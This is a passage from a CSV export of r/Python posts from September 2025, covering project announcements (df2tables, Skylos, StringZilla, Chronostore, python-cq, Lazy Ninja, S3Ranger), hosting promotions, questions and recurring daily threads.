- PyPI: https://pypi.org/project/fastapi-project-starter/
"
1np7qc8,[Project] df2tables - Export pandas DataFrames as  interactive HTML tables,No_Pineapple449,21,0,2025-09-24 09:36:26,https://www.reddit.com/r/Python/comments/1np7qc8/project_df2tables_export_pandas_dataframes_as/,"Hey everyone,

I built a small Python utility called **df2tables**

**What my project does**  
`df2tables` converts `pandas`  and `polars dataframes` into standalone interactive HTML tables using the DataTables JS library. It produces a single, lightweight HTML file you can open in any browser - **no Jupyter, no server.**

It renders directly from a compact JavaScript array, keeping file sizes small while still handling large datasets responsively. It also includes the latest ColumnControl component from DataTables, giving you flexible column visibility management out of the box.

**Customization** \- you can  configure DataTables options **directly from Python**

**Target audience**  
It‚Äôs designed to embed seamlessly into popular web frameworks like Flask, Django, or FastAPI -  making it perfect for dashboards, admin panels, or lightweight data apps.

This can be useful for people who work with dataframes but don‚Äôt use Jupyter, or who want to share DataFrames as portable, interactive tables without extra setup.

For quick visual data exploration, it's easier to just enter text into the datatables search box, which searches in all text columns, than to build a filter in pandas (ColumnControl is even more convenient)

**Comparison**  
Projects like **itables** offer powerful Jupyter integration, but need Ipython and they rely on a notebook environment. `df2tables` is deliberately much smaller and simpler -  and the output is a fully standalone HTML file.

Requires only `pandas` ***or*** `polars -` you don‚Äôt need both.

Because the output is plain HTML+JS, it‚Äôs trivial to embed these tables into any web framework (Flask, Django, FastAPI etc.), which makes it flexible. It stays lightweight while still supporting professional-grade features like filtering, sorting.

Repo: [https://github.com/ts-kontakt/df2tables](https://github.com/ts-kontakt/df2tables)"
1np6xet,Multi-Signal Trading Strategy with RSI and Moving Averages,pknerd,0,2,2025-09-24 08:42:06,https://www.reddit.com/r/Python/comments/1np6xet/multisignal_trading_strategy_with_rsi_and_moving/,"Created a Python script that combines RSI and moving average indicators to generate trading signals with interactive visualizations.

Tech stack:

* pandas-ta for technical indicators
* yfinance for data
* plotly for interactive charts with subplots
* Custom signal logic with confirmation rules

The visualization shows price action, moving averages, RSI, and buy/sell signals all in one interactive chart.

Code walkthrough and explanation given [here](https://blog.adnansiddiqi.me/building-your-first-multi-signal-trading-strategy-with-rsi-and-moving-averages/).

"
1np0ijo,"Plot Twist: After Years of Compiling Python, I‚Äôm Now Using AI to Speed It Up",DivineSentry,0,6,2025-09-24 02:22:31,https://www.reddit.com/r/Python/comments/1np0ijo/plot_twist_after_years_of_compiling_python_im_now/,"# My Journey with Python Performance Optimization: From Nuitka to AI-Powered Solutions

Hi everyone,

This post: [AI Python Compiler: Transpile Python to Golang with LLMs for 10x perf gain](https://discuss.python.org/t/ai-python-compiler-transpile-python-to-golang-with-llms-for-10x-perf-gain-pypi-like-service-to-host-transpiled-packages/103759) motivated me to share my own journey with Python performance optimization.

As someone who has been passionate about Python performance in various ways, it's fascinating to see the diverse approaches people take towards it. There's Cython, the Faster CPython project, mypyc, and closer to my heart, Nuitka.

I started my OSS journey by contributing to Nuitka, mainly on the packaging side (support for third-party modules, their data files, and quirks), and eventually became a maintainer.

## A bit about Nuitka and its approach

For those unfamiliar, Nuitka is a Python compiler that translates Python code to C++ and then compiles it to machine code. Unlike transpilers that target other high-level languages, Nuitka aims for 100% Python compatibility while delivering significant performance improvements.

What makes Nuitka unique is its approach:

- It performs whole-program optimization by analyzing your entire codebase and its dependencies
- The generated C++ code mimics CPython's behavior closely, ensuring compatibility with even the trickiest Python features (metaclasses, dynamic imports, exec statements, etc.)
- It can create standalone executables that bundle Python and all dependencies, making deployment much simpler
- The optimization happens at multiple levels: from Python AST transformations to C++ compiler optimizations

One of the challenges I worked on was ensuring that complex packages with C extensions, data files, and dynamic loading mechanisms would work seamlessly when compiled. This meant diving deep into how packages like NumPy, SciPy, and various ML frameworks handle their binary dependencies and making sure Nuitka could properly detect and include them.

## The AI angle

Now, in my current role at [Codeflash](https://codeflash.ai), I'm tackling the performance problem from a completely different angle: using AI to rewrite Python code to be more performant.

Rather than compiling or transpiling, we're exploring how LLMs can identify performance bottlenecks and automatically rewrite code for better performance while keeping it in Python.

This goes beyond just algorithmic improvements - we're looking at:

- Vectorization opportunities
- Better use of NumPy/pandas operations
- Eliminating redundant computations
- Suggesting more performant libraries (like replacing `json` with `ujson` or `orjson`)
- Leveraging built-in functions over custom implementations

My current focus is specifically on optimizing async code:
- Identifying unnecessary awaits
- Opportunities for concurrent execution with `asyncio.gather()`
- Replacing synchronous libraries with their async counterparts
- Fixing common async anti-patterns

The AI can spot patterns that humans might miss, like unnecessary list comprehensions that could be generator expressions, or loops that could be replaced with vectorized operations.

## Thoughts on the evolution

It's interesting how the landscape has evolved from pure compilation approaches to AI-assisted optimization. Each approach has its trade-offs, and I'm curious to hear what others in the community think about these different paths to Python performance.

What's your experience with Python performance optimization?

Any thoughts?

edit: thanks u/EmberQuill for making me aware of the markdown issue; this isn't LLM generated; I copied the content directly from [my DPO](https://discuss.python.org/t/plot-twist-after-years-of-compiling-python-im-now-using-ai-to-speed-it-up/103916) thread and it brought on the formatting, which I hadn't noticed"
1nomupo,Trouble with deploying Python programs as internal tools?,Competitive-Water302,71,88,2025-09-23 16:57:05,https://www.reddit.com/r/Python/comments/1nomupo/trouble_with_deploying_python_programs_as/,"Hi all I have been trying to figure out better ways to manage internal tooling. Wondering what are everyones biggest blockers / pain-points when attempting to take a python program, whether it be a simple script, web app, or notebook, and converting it into a usable internal tool at your company? 

Could be sharing it, deploying to cloud, building frontend UI, refactoring code to work better with non-technical users, etc."
1noj6sr,Skylos dead code detector,papersashimi,3,7,2025-09-23 14:39:48,https://www.reddit.com/r/Python/comments/1noj6sr/skylos_dead_code_detector/,"Hola! I'm back! Yeap I've promoted this a couple of times, some of you lurkers might already know this. So anyway I'm back with quite a lot of new updates. 

Skylos is yet another static analysis tool for Python codebases written in Python that detects dead code, secrets and dangerous code. Why skylos? 

Some features include:

* **CST-safe removals:**¬†Uses LibCST to remove selected imports or functions
* **Framework-Aware Detection**: Attempt at handling Flask, Django, FastAPI routes and decorators .. Still wip
* **Test File Exclusion**: Auto excludes test files (you can include it back if you want)
* **Interactive Cleanup**: Select specific items to remove from CLI
* **Dangerous Code detection**
* **Secrets detection**
* **CI/CD integration**

You can read more in the repo's README 

I have also recently released a new VSC extension that will give you feedback everytime you save the file. (search for skylos under the vsc marketplace). Will be releasing for other IDEs down the road.

**Future plans in the next update**

* Expanding to more IDEs 
* Increasing the capability of the extension
* Increasing the capabilities of searching for dead code as well as dangerous code

**Target audience:**

Python developers

Any collaborators/contributors will be welcome. If you found the repo useful please give it a star. If you like some features you can ping me here or drop a message inside the discussion tab in the skylos repo. Thanks for reading folks and have a wonderful rest of the week ahead. 

  
Link to the repo: [https://github.com/duriantaco/skylos](https://github.com/duriantaco/skylos)"
1nohze7,Real-Time BLE Air Quality data into Adafruit IO using python,bleuio,6,1,2025-09-23 13:52:01,https://www.reddit.com/r/Python/comments/1nohze7/realtime_ble_air_quality_data_into_adafruit_io/,"This project shows how to turn a BleuIO USB dongle into a tiny gateway that streams live¬†**air-quality data**¬†from a HibouAir sensor straight to¬†**Adafruit IO**. The python script listens for Bluetooth Low Energy (BLE) advertising packets, decodes CO2, temperature, and humidity, and posts fresh readings to your Adafruit IO feeds every few seconds. The result is a clean, shareable dashboard that updates in real time‚Äîperfect for demos, labs, offices, classrooms, and proofs of concept.  
Details of this tutorial and source code available at   
[https://www.bleuio.com/blog/real-time-ble-air-quality-monitoring-with-bleuio-and-adafruit-io/](https://www.bleuio.com/blog/real-time-ble-air-quality-monitoring-with-bleuio-and-adafruit-io/)"
1noegsu,Python 3.14 ‚Äì What you need to know,ExtensionSuccess8539,0,7,2025-09-23 11:10:26,https://www.reddit.com/r/Python/comments/1noegsu/python_314_what_you_need_to_know/,"We're currently on 3.14.0rc3 (Release Candidate 3) with the official release of Python 3.14 scheduled for the 7th of October (2 weeks from now). To save users the trouble of going through all of the release notes, discussions and PEP docs, Cloudsmith have compiled a shortened, synthesized version of the Python 3.14 release notes as we approach the release date. There's some really interesting changes in this release, such as discontinuing PGP signatures in favour of short-lived Sigstore signing through OIDC, making Parentheses Optional in Except and Except Blocks, as well as deferred Evaluation Of Annotations Using Descriptors.   
  
If you're excited about this upcoming release, check out the full full release notes here:  
[https://cloudsmith.com/blog/python-3-14-what-you-need-to-know](https://cloudsmith.com/blog/python-3-14-what-you-need-to-know) "
1noebrx,Why is Spyder so slow,Southern_Primary1824,0,13,2025-09-23 11:02:39,https://www.reddit.com/r/Python/comments/1noebrx/why_is_spyder_so_slow/,"I recently installed Spyder, I am so disappointed in it's speed of accomplishing tasks, even getting it to start is a tag of war. The machine I am using satisfies all the requirements, I have never experienced issues with any other applications, even apps of 20GBs are running faster than an app of approximately 600mbs. Is this a general issue?? I want honest opinion."
1nodyna,Python Recursion Made Simple,Sea-Ad7805,0,3,2025-09-23 10:41:35,https://www.reddit.com/r/Python/comments/1nodyna/python_recursion_made_simple/,"Some struggle with recursion, but as package invocation\_tree visualizes the Python call tree in real-time, it gets easy to understand what is going on and to debug any remaining issues.

See this one-click [Quick Sort demo](https://www.invocation-tree.com/#codeurl=https://raw.githubusercontent.com/bterwijn/invocation_tree/refs/heads/main/src/quick_sort.py&timestep=0.5&play) in the Invocation Tree Web Debugger."
1nodt93,Python Sanity Check,Longjumping_Leg2213,0,10,2025-09-23 10:32:50,https://www.reddit.com/r/Python/comments/1nodt93/python_sanity_check/,Sanity check: I don't really know Python but boss wants me to hand code Python to pull data from a proprietary REST API we use. API is in-house so no open source or off the shelf library. I've done a fair bit of SQL and data pipeline work but scripting directly against APIs in Python isn't my thing. I guess vibe coding and hack something together in Python but I'll have to maintain it etc. What would you do?
1nodcg2,I nee a fix which i cant able to solve till today,Ok_Tap_1597,0,1,2025-09-23 10:05:10,https://www.reddit.com/r/Python/comments/1nodcg2/i_nee_a_fix_which_i_cant_able_to_solve_till_today/,"The problem is that i used XAMPP for my life for making php projects but when its time for using sql in python even installing and updating all the sql packages in pip, still the python program cannot run the code of sql or even if then it crashed the sql server even installing sql breaks the whole sql system in xampp or python what should i do?"
1nocyn3,StringWa.rs: Which Libs Make Python Strings 2-10√ó Faster?,ashvar,109,9,2025-09-23 09:41:23,https://www.reddit.com/r/Python/comments/1nocyn3/stringwars_which_libs_make_python_strings_210/,"## What My Project Does

I've put together **[StringWa.rs](http://github.com/ashvardanian/StringWa.rs)** ‚Äî a benchmark suite for text and sequence processing in Python. It compares `str` and `bytes` built-ins, popular third-party libraries, and GPU/SIMD-accelerated backends on common tasks like splitting, sorting, hashing, and edit distances between pairs of strings.

## Target Audience

This is for Python developers working with text processing at any scale ‚Äî whether you're parsing config files, building NLP pipelines, or handling large-scale bioinformatics data. If you've ever wondered why your string operations are bottlenecking your application, or if you're still using packages like NLTK for basic string algorithms, this benchmark suite will show you exactly what performance you're leaving on the table.

## Comparison

Many developers still rely on outdated packages like `nltk` (with 38 M monthly downloads) for Levenshtein distances, not realizing the same computation can be **500√ó faster on a single CPU core** or up to **160,000√ó faster on a high-end GPU**. The benchmarks reveal massive performance differences across the ecosystem, from built-in Python methods to modern alternatives like my own **[StringZilla](https://github.com/ashvardanian/StringZilla/)** library (just released v4 under Apache 2.0 license after months of work).

Some surprising findings for native `str` and `bytes`:
* `str.find` is about **10√ó** slower than it can be
* On 4 KB blocks, using `re.finditer` to match byte-sets is **46√ó** slower
* On same inputs, `hash(str)` is **2√ó** slower and has lower quality
* `bytes.translate` for binary transcoding is **4√ó** slower

Similar gaps exist in third-party libraries, like `jellyfish`, `google_crc32c`, `mmh3`, `pandas`, `pyarrow`, `polars`, and even Nvidia's own GPU-accelerated `cudf`, that (depending on the input) can be 100√ó slower than `stringzillas-cuda` on the same H100 GPU.

---

I recently wrote 2 articles about the new algorithms that went into the v4 release, that received some positive feedback on ""r/programming"" ([one](https://www.reddit.com/r/programming/comments/1nm3ath/processing_strings_109x_faster_than_nvidia_on_h100), [two](https://www.reddit.com/r/programming/comments/1nmxdvf/how_a_string_library_beat_opencv_at_image)), so I thought it might be worth sharing the underlying project on ""r/python"" as well ü§ó

This is in no way a final result, and there is a ton of work ahead, but let me know if I've overlooked important directions or libraries that should be included in the benchmarks!

Thanks, Ash!"
1no2n2e,Tuesday Daily Thread: Advanced questions,AutoModerator,19,2,2025-09-23 00:00:33,https://www.reddit.com/r/Python/comments/1no2n2e/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1nnwn2h,D&D Twitch bot: Update 2!,ThatTurtleGM,7,3,2025-09-22 19:51:00,https://www.reddit.com/r/Python/comments/1nnwn2h/dd_twitch_bot_update_2/,"Hello! So I posted awhile back that I was making a cool twitch bot for my chatters themed on D&D and wanted to post another update here! (OG post) [https://www.reddit.com/r/Python/comments/1mt2srw/dd\_twitch\_bot/](https://www.reddit.com/r/Python/comments/1mt2srw/dd_twitch_bot/)

My most current updates have made some major strides!

1.) Quests now auto generate quest to quest, evolving over time at checkpoints and be much more in depth overall. Giving chatters a better story, while also  allowing them multiple roll options with skill rolls tied into each class. (Things like barbarians are bad at thinking, but great at smashing! So they might not be the best at a stealth mission in a China shop...)   
  
2.) The bot now recognizes new chatters and greets them with fanfare and a little ""how to"" so they are not so confused when they first arrive. And the alert helps so I know they are a first time chatter!   
  
3.) I got all the skill rolls working, and now they are showing and updated in real time on the display. That way chatters can see at all times which skills are the best for this adventure they are on!   
  
4.) Bosses now display across the ENTIRE screen for the bot, being a big ol pain until they are defeated!  
  
5.) The druid weather effects now work, and have sounds on them (Some are very fun lol) and no longer spam repeats over and over.  
  
6.) Small bugs got fixed and many more popped up, so expect more updates soon(ish) 

You can check it out when I'm live sometime [https://www.twitch.tv/thatturtlegm](https://www.twitch.tv/thatturtlegm)"
1nnqaor,Which Tech role will be in demand at most in 2026?,Hour-Computer-4857,0,20,2025-09-22 15:54:31,https://www.reddit.com/r/Python/comments/1nnqaor/which_tech_role_will_be_in_demand_at_most_in_2026/,"Hello everyone, 

I am Python developer and want to go either toward AI, ML or Data science. which one do you suggest the most? "
1nnqa6s,An app I built with Reflex...,Wonderful-Today-497,19,5,2025-09-22 15:54:01,https://www.reddit.com/r/Python/comments/1nnqa6s/an_app_i_built_with_reflex/,"I read alot of medical journals (just a hobby of mine) and naturally I always start with the abstract, and if the study sounds good I'll try to see if its available in full text.


\### What My Project Does


I got the idea of maybe combining some lightweight LLM model with PubMed and well this is what I got!


This app (I don't have a name for it yet) lets. you create folders/collections, and add pubmed abstracts (with URL to the actual article) and includes a built in collection viewer where you can easily summarize selected articles or talk to the LLM that has some degree of awareness on what you're reading


It's pretty cool that the entire thing was built using only Python. The back end and the LLM itself (gemini flash model) was easily created using just python; also the front end completely in Python as well


\### Target Audience

All python devs I guess or anyone interested in creating full stack apps in a single stack language. I probably would not have built it if I had to go and pick up some JS + HTML just to create the front end!


\### Comparison

Hmm not sure if I've seen any apps like it but im sure there's plenty, I just havent searched for them.


Source Video: [https://youtu.be/eXaa40MiIGs](https://youtu.be/eXaa40MiIGs)

Framework Used to build: [https://github.com/reflex-dev/reflex](https://github.com/reflex-dev/reflex)"
1nnokzl,S3Ranger - A TUI for S3 and S3-like cloud storage built using Textual,swifty_sanchez,19,2,2025-09-22 14:50:44,https://www.reddit.com/r/Python/comments/1nnokzl/s3ranger_a_tui_for_s3_and_s3like_cloud_storage/,"### What My Project Does  
I built **s3ranger**, a TUI to interact with S3 and S3-like cloud storage services. It‚Äôs built with [Textual](https://github.com/Textualize/textual) and uses **boto3** + **awscli** under the hood.  
While the **AWS CLI** already supports most of these operations, I wanted an actual interface on top of it that feels quick and easy to use.  

Some things it can do that the standard S3 console doesn‚Äôt give you:  
- Download a ""folder"" from S3  
- Rename a ""folder""  
- Upload a ""folder""  
- Delete a ""folder""  

### Target Audience  
This project is mainly for developers who:  
- Use **localstack** or other S3-compatible services and want a simple UI on top  
- Need to do batch/folder operations that the AWS S3 web UI doesn‚Äôt provide  
- Like terminal-first tools (since this is a TUI, not a web app)  

It‚Äôs not meant to replace the CLI or the official console, but rather to make repetitive/local workflows faster and more visual.

--
You can run it against localstack like this:  
```
s3ranger --endpoint-url http://localhost:4566 --region-name us-east-1
```
### GitHub Link  
Repo: [https://github.com/Sharashchandra/s3ranger](https://github.com/Sharashchandra/s3ranger)

Any feedback is appreciated!"
1nnn35x,Append-only time-series storage in pure Python: Chronostore (faster than CSV & Parquet),rundef,24,11,2025-09-22 13:52:57,https://www.reddit.com/r/Python/comments/1nnn35x/appendonly_timeseries_storage_in_pure_python/,"# What My Project Does

*Chronostore* is a fast, append-only binary time-series storage engine for Python. It uses schema-defined daily files with memory-mapped zero-copy reads compatible with Pandas and NumPy. (supported backends: flat files or LMDB)

In benchmarks (10M rows of 4 float64 columns), *Chronostore* wrote in `~0.43 s` and read in `~0.24 s,` vastly outperforming CSV (`58 s` write, `7.8 s` read) and Parquet (`~2 s` write, `~0.44 s` read).

Key features:

* Schema-enforced binary storage
* Zero-copy reads via mmap / LMDB
* Daily file partitioning, append-only
* Pure Python, easy to install and integrate
* Pandas/NumPy compatible

Limitations:

* No concurrent write support
* Lacks indexing or compression
* Best performance on SSD/NVMe hardware

# Links

* üëâ [The GitHub repo](https://github.com/rundef/chronostore)

if you find it useful, a ‚≠ê would be amazing!

# Why I Built It

I needed a simple, minimal and high-performance local time-series store that integrates cleanly with Python data tools. Many existing solutions require servers, setup, or are too heavy. *Chronostore* is lightweight, fast, and gives you direct control over your data layout

# Target audience

* Python developers working with **IoT, sensor, telemetry, or financial tick data**
* Anyone needing **schema-controlled, high-speed local time-series persistence**
* Developers who want **fast alternatives to CSV or Parquet for time-series data**
* Hobbyists and students exploring **memory-mapped I/O and append-only data design**

‚≠ê If you find this project useful, consider giving it a star on GitHub, it really helps visibility and motivates further development: [https://github.com/rundef/chronostore](https://github.com/rundef/chronostore)"
1nnmhmw,Lazy Ninja ‚Äì Automate Django APIs & Generate SDKs for Multiple Languages,Aghasty_GD,4,0,2025-09-22 13:27:59,https://www.reddit.com/r/Python/comments/1nnmhmw/lazy_ninja_automate_django_apis_generate_sdks_for/,"# What My Project Does

Lazy Ninja is a Python library for Django that removes boilerplate from your APIs. It automatically generates CRUD endpoints from your Django models, creates Pydantic schemas for listing, creating, updating, and detailing records, and even generates SDKs/clients for multiple languages like TypeScript, Go and more.

It also comes with:

* Async endpoints by default (configurable to sync if needed).
* Interactive API documentation via Swagger UI and ReDoc.
* Smart filtering, sorting, and customizable hooks to add your own logic.

With Lazy Ninja, you can focus on building features instead of writing repetitive code or keeping frontend clients in sync.

# Target Audience

Lazy Ninja is for developers building Django projects who want to save time on repetitive API work. It works great for internal tools, prototypes, or learning projects‚Äîand I hope that with community contributions, it will soon be fully ready for production use hahaha ü•∫

If you‚Äôve ever wished Django could handle the boring parts for you, Lazy Ninja can help.

# Comparison

Compared to using Django Ninja or DRF manually:

* **Time-saving:** No need to write the same CRUD endpoints repeatedly.
* **Multi-language SDK generation:** Clients for TypeScript, Dart, Python, Go, Java, C#, and more.
* **Automatic Pydantic schema generation:** Eliminates errors from manually writing schemas.
* **Better for async projects:** Designed to leverage Django‚Äôs async features seamlessly.

It‚Äôs not a replacement for Django Ninja or DRF‚Äîrather, it builds on top of them and removes repetitive tasks, making API development faster and more consistent.

# Recent Updates / Highlights

* **Project scaffolding:** Quickly start a new Django project with `lazy-ninja init` (includes [`api.py`](http://api.py) and minimal setup).
* **SDK generation:** `lazy-ninja generate-client` now supports multiple languages from your backend schema, without running the server.
* **UUID support:** If your models use UUID primary keys, Lazy Ninja now handles them correctly in CRUD routes.

# Links

* GitHub: [https://github.com/AghastyGD/lazy-ninja](https://github.com/AghastyGD/lazy-ninja)
* Docs: [https://lazy-ninja.readthedocs.io](https://lazy-ninja.readthedocs.io)"
1nnj1rc,Extract complex bracket structure from pdf,dannewestis,2,5,2025-09-22 10:41:56,https://www.reddit.com/r/Python/comments/1nnj1rc/extract_complex_bracket_structure_from_pdf/,"I'm trying to extract text from a pdf, with a complex bracket structure (multiple rounds with winner and score of each match as players in next round, and potentially empty slots for BYEs etc.). I've tried pdfplumber, and I've tried converting to image and using tesseract to get the text from image. But no effort has worked to properly understand what the human eye can read. Tesseract constantly seems to misinterpret the text, particularly Swedish characters (even if adding to whitelist). And pdfplumber extracts the text in a way that is not relatable to the visual columns.

What would be the best way to extract matches and scores from a pdf file like this? Is it even possible?

[bracket pdf](https://drive.google.com/file/d/1mf3BVk0SuBswlaW_7q4YVcALBPaSIV6Q/view?usp=sharing)"
1nnimms,python-cq ‚Äî Lightweight CQRS package for async Python projects,Skearways,25,2,2025-09-22 10:17:14,https://www.reddit.com/r/Python/comments/1nnimms/pythoncq_lightweight_cqrs_package_for_async/,"# What My Project Does

[`python-cq`](https://github.com/100nm/python-cq) is a package that helps apply CQRS principles (Command Query Responsibility Segregation) in async Python projects.

The core idea of CQRS is to separate:

* **Commands** ‚Üí actions that change the state of the system.
* **Queries** ‚Üí operations that only read data, without side effects.
* **Events** ‚Üí facts that describe something that happened, usually triggered by commands.

With `python-cq`, handlers for commands, queries, and events are just regular Python classes decorated with `@command_handler`, `@query_handler`, or `@event_handler`.
The framework automatically detects which message type is being handled based on type hints, no need to inherit from base classes or write boilerplate.

It also integrates with dependency injection through [`python-injection`](https://github.com/100nm/python-injection), which makes it easier to manage dependencies between handlers.

Example:

```python
from dataclasses import dataclass
from injection import inject
from cq import CommandBus, RelatedEvents, command_handler, event_handler

@dataclass
class UserRegistrationCommand:
    email: str
    password: str

@dataclass
class UserRegistered:
    user_id: int
    email: str

@command_handler
class UserRegistrationHandler:
    def __init__(self, events: RelatedEvents):
        self.events = events

    async def handle(self, command: UserRegistrationCommand):
        """""" register the user """"""
        user_id = ...
        event = UserRegistered(user_id, command.email)
        self.events.add(event)

@event_handler
class SendConfirmationEmailHandler:
    async def handle(self, event: UserRegistered):
        """""" send confirmation email """"""

@inject
async def main(bus: CommandBus[None]):
    command = UserRegistrationCommand(email=""root@gmail.com"", password=""root"")
    await bus.dispatch(command)
```

# Target Audience

This library is intended for developers who want to experiment with CQRS principles in async Python projects. I think the project could be production-ready, but I need more feedback to be certain.

If you‚Äôre interested in clean architecture, domain-driven design, or simply curious about alternative ways to structure Python code, this might be useful.

# Comparison

Most existing CQRS frameworks are designed for distributed systems or microservices, often bringing a lot of complexity with them.
`python-cq` tries to stay different by being:

* **Minimal**: just decorators, type annotations, and async.
* **Local-first**: it works well for a single application.
* **Integrated with DI**: works out of the box with `python-injection`.

It‚Äôs trying to provide a simple, Pythonic way to use CQRS ideas in async projects.

Source code: https://github.com/100nm/python-cq"
1nnh6g0,"We just launched Leapcell, deploy 20 Python websites for free",OfficeAccomplished45,66,46,2025-09-22 08:45:51,https://www.reddit.com/r/Python/comments/1nnh6g0/we_just_launched_leapcell_deploy_20_python/,"hi r/Python

Back then, I often had to pull the plug on side projects built with Python, the hosting bills and upkeep just weren‚Äôt worth it. They ended up gathering dust on GitHub.

That‚Äôs why we created **Leapcell**: a platform designed so your Python ideas can stay alive without getting killed by costs in the early stage.

**Deploy up to 20 Python websites or services for free (included in our free tier)**  
Most PaaS platforms give you a single free VM (like the old Heroku model), but those machines often sit idle. Leapcell takes a different approach: with a serverless container architecture, we fully utilize compute resources and let you host multiple services simultaneously. While other platforms only let you run one free project, Leapcell lets you run up to **20 Python apps** for free.

And it‚Äôs not just websites, your Python stack can include:

* Web APIS: Django, Flask, FastAPI
* Data & automation: Playwright-based crawlers
* APIs & microservices: lightweight REST or GraphQL services

We were inspired by platforms like Vercel (multi-project hosting), but Leapcell goes further:

* **Multi-language support:** Django, Node.js, Go, Rust.
* **Two compute modes**
   * ***Serverless***: cold start < 250ms, autoscaling with traffic (perfect for early-stage Django apps).
   * ***Dedicated machines***: predictable costs, no risk of runaway serverless bills, better unit pricing.
* **Built-in stack:** PostgreSQL, Redis, async tasks, logging, and even web analytics out of the box.

So whether you‚Äôre running a Django blog, a Flask API, or a Playwright-powered scraper, you can start for free and only pay when you truly grow.

If you could host 20 Python projects for free today, what would you build first?"
1nn7o0l,Monday Daily Thread: Project ideas!,AutoModerator,4,1,2025-09-22 00:00:39,https://www.reddit.com/r/Python/comments/1nn7o0l/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1nn7o08,Monday Daily Thread: Project ideas!,AutoModerator,19,1,2025-09-22 00:00:38,https://www.reddit.com/r/Python/comments/1nn7o08/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1nn2o95,Best Jupyter TUI,ihatebeinganonymous,23,11,2025-09-21 20:26:39,https://www.reddit.com/r/Python/comments/1nn2o95/best_jupyter_tui/,"Hi. There has apparently been a recent ""surge"" in TUI/CLI-based apps, with the help of Python-based libraries such as Textual.

There are many such TUIs for creating and running Jupyter notebooks, but the last time I checked most were out of date, rarely used, or incomplete in features.

Has anyone used one such Jupyter TUIs successfully? Has any of them come out as ""the"" winner? My main concern is autocomplete and Intellisense.


Thanks"
1nmycfj,Do you find it helpful to run Sphinx reStructuredText/Markdown in a browser?,mattdocumatt,23,12,2025-09-21 17:41:14,https://www.reddit.com/r/Python/comments/1nmycfj/do_you_find_it_helpful_to_run_sphinx/,"I‚Äôve been thinking a lot about documentation workflows lately. Sphinx is super powerful (and pretty much the standard for Python), but every time I try to onboard someone new, the initial ‚Äúinstall + configure‚Äù step feels like a wall.

For example, if you just want to:

* Test how reStructuredText or MyST Markdown renders
* Show a student how Sphinx works
* Experiment with docs-as-code quickly
* Quickly see the resulting HTML when styling Sphinx themes

‚Ä¶you still need a local setup, which isn‚Äôt always trivial. Has anyone else struggled with this? How do you usually get around the ‚Äúfirst steps‚Äù friction when teaching or experimenting with Sphinx?  
  
